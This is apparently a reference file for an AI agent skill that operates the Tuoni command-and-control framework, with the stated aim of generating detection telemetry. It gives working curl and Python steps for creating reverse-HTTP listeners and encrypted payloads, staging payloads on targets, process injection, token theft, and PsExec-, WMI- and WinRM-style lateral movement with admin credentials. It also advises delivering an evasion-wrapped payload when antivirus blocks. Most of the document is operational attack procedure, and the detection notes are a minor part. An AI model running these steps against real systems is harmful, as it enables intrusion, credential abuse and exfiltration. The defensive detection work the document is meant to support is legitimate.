# Tuoni C2 — API Reference & Quirks

Deep reference for the `tuoni` skill's stages. Covers REST endpoints,
listener/payload/command catalogs, the Python library, Known API Quirks, and
per-op lateral wire signatures + detection coverage. Loaded on demand from
`../SKILL.md`.

## Known API Quirks

Confirmed behaviors — do not assume standard patterns:

**Authentication returns raw JWT, not JSON.**
`POST /api/v1/auth/login` responds with `Content-Type: text/plain` — the body IS
the JWT token string directly, NOT wrapped in `{"token": "..."}`.

**Command results contain embedded Windows CRLF control characters.**
Use `json.loads(raw, strict=False)` — standard `json.loads()` throws
`Invalid control character` errors on Windows command output.

**Agent records persist after process death.**
After `die`, the agent record stays in `/agents/active` indefinitely. Poll
command status (not agent presence) to confirm exit; then
`PUT /agents/{guid}/inactive` to clean up.

**Live agents re-register after `PUT /inactive`.**
Marking inactive does not kill the process. To truly stop: send `die` first,
wait one beacon cycle (~10 s), then `PUT /inactive`.

**Headless agent deploy: spawn must break away from the OpenSSH job object.**
Every process started in an SSH session inherits sshd's job object; on session
close it is terminated. Symptoms: no agent ever beacons (silent failure); or
agent registers briefly then `lastCallbackTime` stops. The fix is
`CreateProcess` via P/Invoke with `CREATE_BREAKAWAY_FROM_JOB` (0x01000000).

## REST API Reference

Base URL: `https://<c2-host>:8443/api/v1`
OpenAPI docs: `https://<c2-host>:8443/docs/ui` (Swagger), `/docs/api` (JSON)

All endpoints require `Authorization: Bearer {token}` unless noted. Use `-k`
(self-signed cert).

### Authentication

```bash
TOKEN=$(curl -sk -X POST "https://<c2-host>:8443/api/v1/auth/login" \
  -H "Authorization: Basic $(printf '%s' '<user>:<pass>' | base64)")
# TOKEN is the JWT string directly — no jq parsing needed
```

### Listeners

| Method | Path | Notes |
|---|---|---|
| GET | `/api/v1/plugins/listeners` | Available listener plugins + schemas |
| POST | `/api/v1/listeners` | Create listener (auto-starts) |
| GET | `/api/v1/listeners` | List all (dict keyed by id) |
| PUT | `/api/v1/listeners/{id}/start` | Start (idempotent) |
| PUT | `/api/v1/listeners/{id}/stop` | Stop |
| DELETE | `/api/v1/listeners/{id}` | Delete |

**Always query plugins first** to discover schemas in the running instance.

| Plugin ID | Protocol | Notes |
|---|---|---|
| `shelldot.listener.agent-reverse-http` | HTTP/HTTPS | **Default. Use with `https: true`.** |
| `shelldot.listener.agent-reverse-tcp` | TCP | Use only when instructed by operator |
| `shelldot.listener.agent-reverse-dns` | DNS | Commercial |
| `shelldot.listener.relay-agent-bind-smb` | SMB pipe | For pivot/relay |
| `shelldot.listener.relay-agent-bind-tcp` | TCP bind | For pivot/relay |

**Staged payload URL** — the listener serves payloads at:
`https://<c2-host>:<port><stagedUri>?<stagedUriPayloadId>=<payload_id>`

The payload binary must never transit the machine driving the op — download it
on the target.

### Payloads

| Method | Path | Notes |
|---|---|---|
| GET | `/api/v1/plugins/payloads` | List payload plugins |
| GET | `/api/v1/payloads/templates` | List payload templates |
| POST | `/api/v1/payloads` | Create payload |
| GET | `/api/v1/payloads` | List all (field is `listeners` not `listenerId`) |
| GET | `/api/v1/payloads/{id}` | Payload details |
| GET | `/api/v1/payloads/{id}/download` | Download binary |

Create payload body:
```json
{
  "payloadTemplateId": "shelldot.payload.windows-x64",
  "configuration": {"type": "EXECUTABLE", "initialWait": 0, "paddingSize": 0},
  "listenerId": 1,
  "encrypted": true
}
```

**Payload type per delivery primitive:**

| Delivery | Required `type` | Why |
|---|---|---|
| SSH spawn (foothold) | `EXECUTABLE` | Plain PE, user-mode process |
| `jump-service` (SMB+SCMR) | **`SERVICE`** | SCM kills EXECUTABLE at 30 s timeout |
| `jump-wmi` / `jump-winrm` | `EXECUTABLE` | Spawned via cmdline, no SCM |
| `spawn` (process injection) | `SHELLCODE` | Injected, not loaded as PE |

Always query `GET /api/v1/payloads/templates` to discover what's available.

### Agents

| Method | Path | Notes |
|---|---|---|
| GET | `/api/v1/agents` | All agents |
| GET | `/api/v1/agents/active` | Active only |
| GET | `/api/v1/agents/{guid}` | Details (metadata, availableCommands) |
| PUT | `/api/v1/agents/{guid}/inactive` | Deactivate |
| POST | `/api/v1/agents/{guid}/commands/queue/clear` | Clear pending commands |

Metadata fields (`username`, `pid`, `hostname`, `ips`, etc.) are null immediately
after first check-in; populated after the next beacon cycle.

### Commands

| Method | Path | Notes |
|---|---|---|
| GET | `/api/v1/command-templates` | All templates (name, qualifiedName, schema) |
| GET | `/api/v1/command-templates/{id}` | Template by UUID (name → 400) |
| POST | `/api/v1/agents/{guid}/commands` | Send command |
| GET | `/api/v1/commands/{id}` | Get command result |
| PUT | `/api/v1/commands/{id}/stop` | Stop/cancel |

**`template` field — bare names are unreliable. Always use UUID or qualifiedName.**
Confirmed-fail bare names: `portscan`, `token-make`, `token-use`,
`jump-service`, and most `shelldot.commands.*` templates. **Always look up the UUID
from `GET /command-templates`.**

```bash
TID=$(curl -sk "$C2/api/v1/command-templates" -H "$H" \
  | jq -r '.[] | select(.name=="jump-service") | .id')
```

`execConf` is optional. When provided: `execType` = NEW (spawn) or EXISTING
(inject). **`suspended: true` is required for SHELLCODE on Win11** — otherwise
injection silently no-ops.

Command result status: `CREATED` → `SENT` → `COMPLETE` | `FAILED`.
STDOUT in `result.childResults[]` filtered by `name == "STDOUT"`.

#### Command Template Catalog

**Core execution:**
`cmd`, `powershell`, `run`, `runas`, `sleep`, `die`, `jobs`, `ls`, `cd`, `ps`

**File operations:**
`download`, `upload`, `cp`, `mv`, `rm`, `rmdir`, `mkdir`

**Network (generates detectable traffic):**
`socks5`, `connect-tcp`, `connect-smb`, `rportfwd`

**Lateral movement:**
- `jump-service` — Config: `{target, payloadId, copyMethod, copyPath, serviceName, cleanup, username, password}`. Required: `target`. Field is `target`, NOT `host`.
- `jump-winrm` — Config: `{target, payloadId, …}`. Pass hostname, not IP.
- `jump-wmi` — Config: `{target, payloadId, …}`.
- `jump-ssh` — Config: `{target, …}`.
- `spawn` — Config: `{payloadId, encryptedCommunication}`
- `inject` — Config: `{pid, payloadId}`

**Token manipulation:**
- `token-make` — Config: `{username, password, netonly}`. **No `domain` field** — pass `<NETBIOS>\\<user>` as `username`. `netonly: true` creates LOGON32_LOGON_NEW_CREDENTIALS (outbound-only impersonation). Result format: `<nr>: <orig>[NETONLY: <impersonated>]`.
- `token-use` — Config: `{nr}` — token index from token-make/list output. `nr: 0` reverts.
- `token-steal` — Config: `{pid}`
- `token-list`, `token-del`, `token-del-all`, `token-from-handle`

**Reconnaissance:**
- `portscan` — Submit as `shelldot.commands.net:global:portscan`. Config: `{ips, ports, hostDiscovery}`. Populates `/discovery/hosts` + `/discovery/services`.
- `screenshot`, `execute-assembly`, `bof`

> **Always fetch the live config schema** — `GET /api/v1/command-templates`
> returns `configurationSchema` (full JSON Schema) per template. Field names
> drift between versions; trust the schema.

### Discovery

| Method | Path | Notes |
|---|---|---|
| GET/POST | `/api/v1/discovery/hosts` | Hosts (address, name, note) |
| GET/POST | `/api/v1/discovery/services` | Services (address, port, protocol) |
| GET/POST | `/api/v1/discovery/credentials` | Credentials |

Populated automatically by `portscan` and similar commands, or manually.

## Python Library (tuoni-pip)

For complex orchestration with control flow.

**Install** — once into the environment:
```bash
pip install -r requirements.txt
```

**Connection:**
```python
import os, sys, urllib3
from tuoni.TuoniC2 import TuoniC2
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

api = os.environ.get("TUONI_API") or sys.exit("TUONI_API not set")
c2 = TuoniC2()
if tok := os.environ.get("TUONI_TOKEN"):
    c2._token = tok; c2._url = api
else:
    c2.login(api, os.environ["TUONI_USER"], os.environ["TUONI_PASS"])
```

**`c2._url` is host:port only — no `/api/v1` path prefix.**
Raw `requests` calls must append `/api/v1` explicitly:
```python
resp = requests.put(
    f"{c2._url}/api/v1/agents/{agent.guid}/inactive",
    headers={"Authorization": f"Bearer {c2._token}"},
    verify=False,
)
```

**Send command — bare-name 404 quirk persists in the library.**
Use a `TuoniCommandTemplate` object instead of a string:
```python
tpls = {t.name: t for t in c2.load_command_templates()}
cmd = agent.send_command(tpls["token-make"],
                         {"username": "<NETBIOS>\\<user>",
                          "password": "<pw>", "netonly": False})
cmd.wait_result(interval=2, maxWait=60)
```

**Result handling** — `cmd.get_result()` returns a `TuoniResult` object:
- `result.get_text()` → STDOUT string (or None)
- `result.error_message` → error on failure
- `result.status`, `result.received` → status fields

**`wait_result` vs `wait_done`** — `wait_result` returns on any result data
(even partial STDOUT while `status == "ongoing"`). For streaming commands
(`portscan`, `keylogger`), use `wait_done(interval=5, maxWait=N)` — it loops
while status is ongoing.

**Picking agents:**
```python
agents = c2.load_agents(active=True)
src = agents[0]   # .guid, .metadata.username, etc.
```

**Waiting for new agent:**
```python
new_agent = c2.wait_new_agent(interval=2, max_wait=300)
```

Key classes: `TuoniC2`, `TuoniAgent`, `TuoniListener`, `TuoniCommand`,
`TuoniCommandTemplate`, `TuoniResult`, `TuoniResultPart`, `TuoniPayload`.

## Traffic Generation Workflows

| Scenario | Protocol / traffic | Key commands |
|---|---|---|
| C2 Beaconing | HTTPS (TLS JA3/JA3S) | listener + payload + `sleep` |
| Lateral Movement | SMB/DCERPC/WinRM | `jump-service`, `jump-wmi`, `jump-winrm` |
| SOCKS5 / Port Forward | Tunneled TCP | `socks5`, `rportfwd`, `connect-tcp` |
| File Exfiltration | Data over C2 channel | `download`, `upload` |
| Credential Ops | Token manipulation events | `token-steal`, `token-make` |
| Process Injection | Sysmon 1 + 8 | `inject`, `spawn`, `execute-assembly` |
| Network Discovery | TCP scan fan-out | `portscan` |

TLS flow events are not flushed until flow timeout or agent termination. The
agent holds a persistent TLS connection; sensors finalise the flow record only
on connection close (FIN) or idle-flow timeout. Terminating the agent forces
a FIN — operator decision.

## Lateral movement — wire signatures & detection coverage

Wire/endpoint signatures per op. Jump creds must use the **NetBIOS short name**
(`<NETBIOS>\<admin-user>`, one backslash). Bare username → `Domain: NONE` →
access denied.

### Deployment quirks

- **Endpoint AV on the target may block the payload.** Wire/auth telemetry
  generates regardless. Read the whole command record (`GET /commands/{id}`),
  retry under a different `copyPath`, and if still blocked deliver an
  evasion-wrapped payload.
- **SMB/445 must be reachable on the target** for the copy step.
- **Bare template names 404** — resolve UUID from `GET /command-templates` first.
- **jump-service payload type = SERVICE, not EXECUTABLE/SHELLCODE.** `payloadId`
  must reference a SERVICE payload. EXECUTABLE → SCM kills at 30 s timeout.
- **jump-service randomizes the binary name** — anchor rules on `\pipe\svcctl`
  opnums and `ADMIN$` write, not the file name.
- **jump-service non-admin failure** — standard-user source fails at SMB write.
  Pass privileged creds via `username`/`password`.
- **`result.errorMessage` carries the cause; STDOUT only shows progress.**
- **jump-winrm requires hostname, not IP.**
- **jump-winrm stays ONGOING** past maxWait — check `/agents/active`.
- **`schtasks /U /P` rejected on Server 2025** — use `token-make` + `token-use`
  first.

### Per-op detail

**1. jump-service (PsExec via SMB service create)** — MITRE T1021.002 + T1569.002.
Copies SERVICE payload to `\\target\c$\Windows\System32\<random>.exe` via SMB,
opens `\pipe\svcctl`, `OpenSCManagerW`→`CreateServiceW`→`StartServiceW`.
- Wire: SMB write to `ADMIN$`; DCERPC `\pipe\svcctl` MS-SCMR; opnums 15, 12/24,
  19, 2; new TLS flow target→C2.
- Endpoint: target Sysmon 1 (`ParentImage=services.exe`), Security 7045 + 4624.

```bash
JS_TID=$(curl -sk "$C2/api/v1/command-templates" -H "$H" | jq -r '.[]|select(.name=="jump-service").id')
LID=$(curl -sk "$C2/api/v1/listeners" -H "$H" | jq -r '[to_entries[].value|select(.plugin=="shelldot.listener.agent-reverse-http" and .status=="started")][0].id')
PID=$(curl -sk "$C2/api/v1/payloads" -H "$H" | jq -r --argjson lid "$LID" '[.[]|select(.configuration.type=="SERVICE" and (.listeners|index($lid)))][0].id')
curl -sk -X POST "$C2/api/v1/agents/$SRC/commands" -H "$H" -H "Content-Type: application/json" -d @- <<JSON
{"template":"$JS_TID","configuration":{"target":"$TGT_IP","payloadId":$PID,"copyMethod":"SMB","serviceName":"TuoniSim$RANDOM","cleanup":true,"username":"<NETBIOS>\\\\<admin-user>","password":"<password>"}}
JSON
```

**2. jump-wmi (WMI/DCOM)** — MITRE T1047 + T1021.003. SMB-copies EXECUTABLE
payload, then `IWbemServices::ExecMethod` for `Win32_Process.Create` over DCOM.
- Wire: SMB write; TCP 135 DCOM OXID; ephemeral WMI interfaces — extract via
  `dcerpc.interfaces[].uuid` (array; singular `interface_uuid` NOT populated):
  `9556dc99` (IWbemServices), `f309ad18` (IWbemLevel1Login), `9f6c78ef`
  (IWbemLoginClientID).
- Endpoint: target Sysmon 1 (`ParentImage=WmiPrvSE.exe`), Security 4624.

```bash
JW_TID=$(curl -sk "$C2/api/v1/command-templates" -H "$H" | jq -r '.[]|select(.name=="jump-wmi").id')
curl -sk -X POST "$C2/api/v1/agents/$SRC/commands" -H "$H" -H "Content-Type: application/json" -d @- <<JSON
{"template":"$JW_TID","configuration":{"target":"$TGT_IP","payloadId":$PID,"username":"<NETBIOS>\\\\<admin-user>","password":"<password>"}}
JSON
```

**3. jump-winrm (WSMAN)** — MITRE T1021.006. SMB-copies to target, then WSMAN
`Start-Process -Wait`. **Pass hostname, not IP.**
- Wire: SMB write; TCP 5985 WSMAN is `app_proto=unknown`;
  auth is **Kerberos** (TGS for HOST SPN on 88), no NTLM.
- Endpoint: target Sysmon 1 (`ParentImage=wsmprovhost.exe`), Security 4624.

```bash
JR_TID=$(curl -sk "$C2/api/v1/command-templates" -H "$H" | jq -r '.[]|select(.name=="jump-winrm").id')
curl -sk -X POST "$C2/api/v1/agents/$SRC/commands" -H "$H" -H "Content-Type: application/json" -d @- <<JSON
{"template":"$JR_TID","configuration":{"target":"$TGT_HOST","payloadId":$PID,"username":"<NETBIOS>\\\\<admin-user>","password":"<password>"}}
JSON
```

**4. schtasks-remote (`cmd schtasks /S`)** — MITRE T1053.005. No native
template — use `cmd`. Wire: DCERPC on `\pipe\atsvc` MS-TSCH + `\pipe\winreg`
MS-RRP on Server 2025.

**5. reg-remote (`cmd reg add \\target`)** — MITRE T1112 + T1021.002. Wire:
DCERPC `\pipe\winreg` MS-RRP.

**6. SMB-pipe agent pivot (`relay-agent-bind-smb` + `connect-smb`)** — MITRE
T1071.002 + T1090.001. Create bind-smb listener, SHELLCODE payload, land on
target via jump-service, then `connect-smb` from source. Wire: SMB named pipe
(distinct from svcctl/atsvc); long-lived session (needs FIN for flow flush).

### Detection notes

- **Flow flush requires connection close** — sensors emit flow records only on
  FIN. Terminating the agent forces a FIN — operator decision.
- **East-west visibility depends on the sensor capture interface** — verify capture
  if no alerts appear.
- **Discovery→lateral chain doubles signal** — portscan first, then jump; the
  scan correlates temporally with the lateral exec.
